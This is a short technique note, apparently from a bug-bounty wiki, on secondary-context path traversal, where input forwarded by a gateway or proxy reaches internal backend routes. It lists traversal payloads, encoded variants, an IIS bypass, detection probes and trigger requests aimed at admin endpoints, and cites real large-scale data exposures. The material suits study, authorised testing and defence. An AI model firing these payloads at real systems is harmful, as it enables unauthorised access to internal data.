---
title: Secondary-context path traversal
slug: secondary-context-path-traversal
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/server-side, technique/path-traversal]
inbound: []
---

# Secondary-context path traversal

## Pattern
When a backend builds an outbound URL/path from your input (gateway →
microservice, reverse-proxy → backend), inject `..` / `%2F..%2F` into the
forwarded segment to escape the intended subpath and reach internal
endpoints not exposed publicly.

Classic forms:
- `POST /api/widget` with `{"id": "<uuid>/../../api/get/<uuid>"}` →
  internal URL becomes `service/api/widget/<uuid>/../../api/get/<uuid>`
  → resolves to `service/api/get/<uuid>` (own data) if gateway concats
  raw → SCPT confirmed.
- `GET /user/../user/<myid>` returns own data → gateway forwards
  verbatim → reach `/admin/users` next.
- IIS virtual-dir traversal: `/sso/..%2f` → escapes `/sso` virtual
  directory to root of mapped backend.
- Sam Curry append-`#` to UUID param: 400 with `text/html` error reveals
  secondary context. Path-traverse via same param → 22M-record dump.

## Preconditions
- Multi-tier architecture (gateway → microservice, proxy → app).
- Path segment from user input concatenated into outbound URL.
- No normalization between layers.

## Detection
- Mathias Karlsson SCPT detection: send identical request with `/`, `%2f`,
  `%252f`, `..;/`, then diff response sizes / status codes.
- Blind SCPT canary (XSSDoctor): `/route/<valid>%2F..%2F<valid>` vs
  `/route/<garbage>` — diff 200 vs 500.
- Probe with `?` or `#` truncators at end of injected segment (frontend
  forwards, backend truncates).

## Triggering
```
GET /api/users/123/../admin/all  HTTP/1.1
GET /api/users/123%2F..%2Fadmin%2Fall  HTTP/1.1
GET /api/users/123/../../admin  HTTP/1.1
POST /api/widget {"id": "<uuid>/../../api/get/<uuid>"}
```

## Related
- [[cspt-react-useparams]] — React `useParams` case-sensitive `%2F`.
- [[cspt-fetch-hijacking]] — client-side variant.
- IIS cookieless `/(S(x))/protected` (Soroush) — separate path-bypass class.
- Static-path reverse-proxy SSRF gadget (Mathias Ep 50): `/static/X →
  backend/X`; provide `static/@example.com` to redirect backend fetch.

## Seen in the wild
- Sam Curry — Starbucks ~99M records (2020); points.com 22M records.
- Critical Thinking Podcast Eps 27, 32, 39, 50.

## References
- Sam Curry — "Attacking Secondary Contexts in Web Applications"
- Critical Thinking Podcast Eps 27, 32, 39, 50
